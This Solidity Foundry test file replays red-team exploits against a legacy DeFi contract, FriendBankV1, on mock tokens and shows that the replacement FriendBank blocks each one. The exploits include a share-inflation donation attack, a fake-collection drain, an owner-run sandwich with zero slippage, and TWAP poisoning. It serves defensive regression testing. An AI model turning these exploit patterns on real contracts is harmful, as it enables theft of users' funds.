// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "./Base.sol";
import {FriendBankV1} from "../src/legacy/FriendBankV1.sol";
import {RangeDesk} from "../src/RangeDesk.sol";
import {PoolObserver} from "../src/PoolObserver.sol";

/*
                        WHY V1 WAS REPLACED

  FriendBankV1 (src/legacy, the original FriendBank.sol) passed 20 of its own tests
  and still lost members' money. Those tests used a market that priced RF and WETH
  1:1 and never tried a second collection, a resale, or a donation. Each exploit
  below is run twice:

    test_V1_*   the attack SUCCEEDS against v1. If one of these ever fails, v1 changed.
    test_V2_*   the same attack FAILS against FriendBank.

  The last section attacks the maker-only desk that replaced v1's taker trade().

  Found by the red team review on 2026-09-22. Prices are the live ratio, about
  1,750,000 RF per WETH. Every Friend and address here is a mock.
*/
/// x*y=k pool with the hook's 5% input toll, 1,000 WETH deep at the live ratio. Used only against v1.
contract CpMarket {
    MToken public rf;
    MToken public weth;
    uint256 public rR = 1_750_000_000e18;
    uint256 public rW = 1_000e18;

    constructor(MToken r, MToken w) { rf = r; weth = w; }

    function swapExactInput(bool buy, uint256 amountIn, uint256 minOut, address to, uint256) external returns (uint256 out) {
        uint256 net = amountIn * 95 / 100;
        if (buy) {
            weth.transferFrom(msg.sender, address(this), amountIn);
            out = rR * net / (rW + net);
            rW += net;
            rR -= out;
            rf.mint(to, out);
        } else {
            rf.transferFrom(msg.sender, address(this), amountIn);
            out = rW * net / (rR + net);
            rR += net;
            rW -= out;
            weth.mint(to, out);
        }
        require(out >= minOut, "slippage");
    }
}

contract WhyV1WasReplaced is Base {
    FriendBankV1 v1;
    MMarket market;

    address mallory = address(0xBAD);

    function setUp() public override {
        super.setUp();
        market = new MMarket(rf, weth);
        v1 = new FriendBankV1(address(rf), address(weth), address(am), address(market));
    }

    /* ================================================================ helpers */

    function _tba(uint256 id) internal view returns (address) {
        return genesis.tokenBoundAccount(id);
    }

    /// The owner approves `spender` for both assets from the Friend's own wallet.
    function _approve(address spender, uint256 id, address who) internal {
        vm.startPrank(who);
        MTBA(_tba(id)).execute(address(rf), 0, abi.encodeCall(MToken.approve, (spender, type(uint256).max)), 0);
        MTBA(_tba(id)).execute(address(weth), 0, abi.encodeCall(MToken.approve, (spender, type(uint256).max)), 0);
        vm.stopPrank();
    }

    function _v1Join(uint256 id, address who, uint256 cap) internal returns (uint256 memberId) {
        memberId = v1.memberCount();
        vm.prank(who);
        v1.join(address(genesis), id, cap);
        _approve(address(v1), id, who);
    }

    function _v2Join(uint256 id, address who, uint128 capRf, uint128 capWeth) internal {
        _approve(address(bank), id, who);
        vm.prank(who);
        bank.join(address(genesis), id, capRf, capWeth, false);
    }

    function _v1WithdrawAll(address who) internal {
        uint256 sh = v1.sharesOf(who);
        vm.prank(who);
        v1.withdraw(sh);
    }

    /* ========================================= 1. RF and WETH added 1:1 as shares */

    function test_V1_OneRfTakesHalfOfOneWeth() public {
        genesis.mint(1, alice);
        genesis.mint(2, mallory);
        uint256 a = _v1Join(1, alice, 100e18);
        uint256 m = _v1Join(2, mallory, 100e18);
        weth.mint(_tba(1), 1e18);               // alice: 1 WETH, about $2,600
        v1.collect(a);
        rf.mint(_tba(2), 1e18);                 // mallory: 1 RF, about $0.0015
        v1.collect(m);
        _v1WithdrawAll(mallory);
        assertEq(weth.balanceOf(mallory), 0.5e18, "v1: 1 RF withdrew half of alice's WETH");
    }

    function test_V2_OneRfTakesNothingFromAlice() public {
        genesis.mint(1, alice);
        genesis.mint(2, mallory);
        _v2Join(1, alice, 0, 100e18);
        _v2Join(2, mallory, 100e18, 0);
        accrue(genesis, 1, 0, 1e18);
        _collectAs(alice, genesis, 1);
        accrue(genesis, 2, 1e18, 0);
        _collectAs(mallory, genesis, 2);
        (uint256 r, uint256 w) = claim(mallory);
        assertEq(w, 0, "v2: mallory owns no WETH");
        assertEq(r, 1e18, "v2: mallory owns exactly her RF");
        (, uint256 aw) = claim(alice);
        assertEq(aw, 1e18, "v2: alice owns exactly her WETH");
    }

    /* ================================ 2. any `collection` accepted, pointing at a victim */

    function test_V1_FakeCollectionDrainsVictimAfterSheLeft() public {
        genesis.mint(1, alice);
        _v1Join(1, alice, 1e18);                // alice caps herself at 1 unit a day
        vm.prank(alice);
        v1.leave(address(genesis), 1);          // and even leaves
        EvilCollection evil = new EvilCollection(_tba(1), mallory);
        vm.prank(mallory);
        v1.join(address(evil), 1, 100_000_000e18);
        weth.mint(_tba(1), 50e18);
        v1.collect(1);
        _v1WithdrawAll(mallory);
        assertEq(weth.balanceOf(mallory), 50e18, "v1: mallory took alice's 50 WETH, past her cap, after she left");
    }

    function test_V2_FakeCollectionRejected() public {
        genesis.mint(1, alice);
        _v2Join(1, alice, 0, 1e18);
        EvilCollection evil = new EvilCollection(_tba(1), mallory);
        vm.prank(mallory);
        vm.expectRevert(FriendBank.UnknownCollection.selector);
        bank.join(address(evil), 1, 0, 100e18, false);
    }

    /* ======================== 3. after a sale the seller keeps collecting the buyer's money */

    function test_V1_SellerCollectsBuyersMoneyAndBuyerIsLockedOut() public {
        genesis.mint(1, alice);
        uint256 a = _v1Join(1, alice, 100e18);
        vm.prank(alice);
        genesis.transferFrom(alice, bob, 1);    // sold; the wallet's allowance moves with it
        weth.mint(_tba(1), 10e18);              // bob's money
        v1.collect(a);
        _v1WithdrawAll(alice);
        assertEq(weth.balanceOf(alice), 10e18, "v1: the seller withdrew the buyer's 10 WETH");
        vm.prank(bob);
        vm.expectRevert(FriendBankV1.AlreadyJoined.selector);
        v1.join(address(genesis), 1, 100e18);
    }

    function test_V2_SaleSuspendsAndBuyerCanJoin() public {
        genesis.mint(1, alice);
        _v2Join(1, alice, 0, 100e18);
        vm.prank(alice);
        genesis.transferFrom(alice, bob, 1);
        accrue(genesis, 1, 0, 10e18);
        collect1(genesis, 1);                   // sees the sale, suspends, pulls nothing
        (, uint256 aw) = claim(alice);
        assertEq(aw, 0, "v2: the seller is credited nothing");
        vm.prank(bob);
        bank.join(address(genesis), 1, 0, 100e18, false);
        _collectAs(bob, genesis, 1);            // the holder collects, so no tip
        (, uint256 bw) = claim(bob);
        assertEq(bw, 10e18, "v2: the buyer's rewards are the buyer's");
    }

    /* ================================= 4. a donation zeroes the next member's deposit */

    function test_V1_DonationMintsVictimZeroShares() public {
        genesis.mint(1, alice);
        genesis.mint(2, mallory);
        uint256 m = _v1Join(2, mallory, 100e18);
        uint256 a = _v1Join(1, alice, 100e18);
        weth.mint(_tba(2), 1);
        v1.collect(m);                          // mallory: 1 wei, 1 share
        weth.mint(mallory, 20e18);
        vm.prank(mallory);
        weth.transfer(address(v1), 20e18);      // donated before the keeper's next collect
        weth.mint(_tba(1), 10e18);
        v1.collect(a);
        assertEq(v1.sharesOf(alice), 0, "v1: alice's 10 WETH minted zero shares");
        _v1WithdrawAll(mallory);
        assertEq(weth.balanceOf(mallory), 30e18 + 1, "v1: mallory took the donation back plus alice's 10");
    }

    function test_V2_DonationChangesNobody() public {
        genesis.mint(1, alice);
        genesis.mint(2, mallory);
        _v2Join(2, mallory, 0, 100e18);
        _v2Join(1, alice, 0, 100e18);
        accrue(genesis, 2, 0, 1);
        _collectAs(mallory, genesis, 2);
        weth.mint(address(bank), 20e18);        // donation
        accrue(genesis, 1, 0, 10e18);
        _collectAs(alice, genesis, 1);
        (, uint256 aw) = claim(alice);
        (, uint256 mw) = claim(mallory);
        assertEq(aw, 10e18, "v2: alice owns her 10 WETH");
        assertEq(mw, 1, "v2: mallory owns her 1 wei, not the donation");
    }

    /* ======================================== 5. the daily cap is spent once per asset */

    function test_V1_CapIsSpentTwice() public {
        genesis.mint(1, alice);
        uint256 a = _v1Join(1, alice, 5e18);
        rf.mint(_tba(1), 5e18);
        weth.mint(_tba(1), 5e18);
        (uint256 r, uint256 w) = v1.collect(a);
        assertEq(r + w, 10e18, "v1: pulled twice the stated cap");
    }

    function test_V2_EachAssetHasItsOwnCap() public {
        genesis.mint(1, alice);
        _v2Join(1, alice, 5e18, 1e18);
        accrue(genesis, 1, 50e18, 50e18);
        _collectAs(alice, genesis, 1);
        (uint256 r, uint256 w) = claim(alice);
        assertEq(r, 5e18, "v2: RF stops at the RF cap");
        assertEq(w, 1e18, "v2: WETH stops at the WETH cap");
    }

    /* ======================== 6. collect sweeps money the owner never offered, not rewards */

    function test_V1_CollectSweepsTheOwnersPrincipal() public {
        genesis.mint(1, alice);
        uint256 a = _v1Join(1, alice, 100_000_000e18);
        rf.mint(_tba(1), 4_500e18);             // alice's own RF, never a reward
        v1.collect(a);
        assertEq(rf.balanceOf(_tba(1)), 0, "v1: principal pulled");
    }

    function test_V2_PrincipalStaysInTheWallet() public {
        genesis.mint(1, alice);
        rf.mint(_tba(1), 4_500e18);
        _v2Join(1, alice, type(uint128).max, type(uint128).max);
        accrue(genesis, 1, 7e18, 0);
        _collectAs(alice, genesis, 1);
        assertEq(rf.balanceOf(_tba(1)), 4_500e18, "v2: only the 7 RF just claimed moved");
        (uint256 r,) = claim(alice);
        assertEq(r, 7e18);
    }

    /* ====== 7. v1's owner is always a keeper, and trade() takes minOut 0 with no count limit */

    function test_V1_OwnerDumpsTheBookIntoItsOwnSandwich() public {
        CpMarket cp = new CpMarket(rf, weth);
        FriendBankV1 v1cp = new FriendBankV1(address(rf), address(weth), address(am), address(cp));
        genesis.mint(1, alice);
        vm.prank(alice);
        v1cp.join(address(genesis), 1, 100_000_000e18);
        _approve(address(v1cp), 1, alice);
        rf.mint(_tba(1), 17_500_000e18);        // RF worth 10 WETH at the pool's price
        v1cp.collect(0);
        uint256 fair = 17_500_000e18 * cp.rW() / cp.rR();

        // This test deployed v1cp, so it is the owner, and the owner passes onlyKeeper.
        rf.mint(address(this), 700_000_000e18);
        rf.approve(address(cp), type(uint256).max);
        cp.swapExactInput(false, 700_000_000e18, 0, address(this), 0);   // front-run: crash RF
        for (uint256 i; i < 60 && rf.balanceOf(address(v1cp)) > 0; ++i) {
            uint256 r = rf.balanceOf(address(v1cp));
            uint256 capAmt = (r + weth.balanceOf(address(v1cp))) * v1cp.maxTradeBps() / 10_000;
            v1cp.trade(false, r < capAmt ? r : capAmt, 0, block.timestamp);   // minOut 0, every call legal
        }
        assertLt(weth.balanceOf(address(v1cp)), fair * 70 / 100, "v1: the owner sold the book for under 70% of its value");
    }

    function test_V2_OwnerCanNeverBeTheKeeper() public {
        vm.expectRevert(FriendBank.BadKeeper.selector);
        new FriendBank(FriendBank.Config({
            rf: address(rf),
            weth: address(weth),
            activation: address(am),
            genesis: address(genesis),
            generations: address(gens),
            poolManager: address(pm),
            hook: address(hook),
            poolFee: 0x800000,
            tickSpacing: 60,
            keeper: address(this)
        }));
    }

    /* ======================== 8. the maker-only desk: attacks that replaced trade() */

    /// A holder exits mid-range, re-deposits, and the range then closes. The close must pay nothing on the
    /// new deposit: it funded no part of the range.
    function test_V2_ExitRedepositThenCloseCreditsOnlyWhatFundedTheRange() public {
        member(genesis, 1, alice, 1_000e18, 0);
        member(genesis, 2, bob, 1_000e18, 0);
        readyTwap();
        placeAsk(300e18);
        fillAsk(4_000, px(ASK_LO + 200));
        vm.prank(alice);
        bank.exitRanges();
        uint256[4] memory a1 = line(alice);

        accrue(genesis, 1, 5_000e18, 0);
        _collectAs(alice, genesis, 1);          // alice's new RF, after her exit
        fillAsk(10_000, px(ASK_LO + 500));
        closeAsk();

        uint256[4] memory a2 = line(alice);
        assertEq(a2[0], a1[0] + 5_000e18, "the close adds nothing to alice's RF but her own deposit");
        assertEq(a2[1], a1[1], "and no WETH from fills after she left");
        assertEq(a2[2], 0);
    }

    /// Someone holds the pool 26% low and pokes every five minutes for an hour. The truncated record can
    /// follow by at most 50 ticks a poke, so an hour of pokes moves the TWAP by about 6%, not 26%.
    function test_V2_AnHourOfPoisonedPokesMovesTheTwapAboutSixPercent() public {
        readyTwap();
        PoolObserver obs = bank.OBSERVER();
        int24 before = obs.twapTick();
        pm.setTick(SPOT - 3_000);
        for (uint256 i; i < 12; ++i) {
            vm.warp(block.timestamp + 5 minutes);
            bank.poke();
        }
        int24 moved = before - obs.twapTick();
        assertLe(moved, 12 * 50, "at most 50 ticks per poke");
        assertLe(obs.lastTick(), before, "the record only followed");
        assertGe(obs.lastTick(), before - 12 * 50, "and by at most 600 ticks (about 6%)");
    }

    /// A tiny ask sold at a pumped price sets a high last-sale price. A big bid near that pumped price is
    /// still refused, because every range must also sit beyond the truncated TWAP.
    function test_V2_TinyPumpedSaleCannotCertifyABigBidNearThePump() public {
        member(genesis, 1, alice, 10_000e18, 1e18);
        readyTwap();
        placeAsk(100e18);                        // 1% of the RF side
        fillAsk(10_000, px(ASK_HI));             // sold at the top of the range
        closeAsk();
        pm.setTick(SPOT + 3_000);                // someone pumps RF 35%
        uint256 wethSide = bank.bookW();
        vm.prank(keeper);
        vm.expectRevert(RangeDesk.TooCloseToTwap.selector);
        bank.placeBid(SPOT + 2_340, SPOT + 2_940, wethSide * 15 / 100);
    }
}
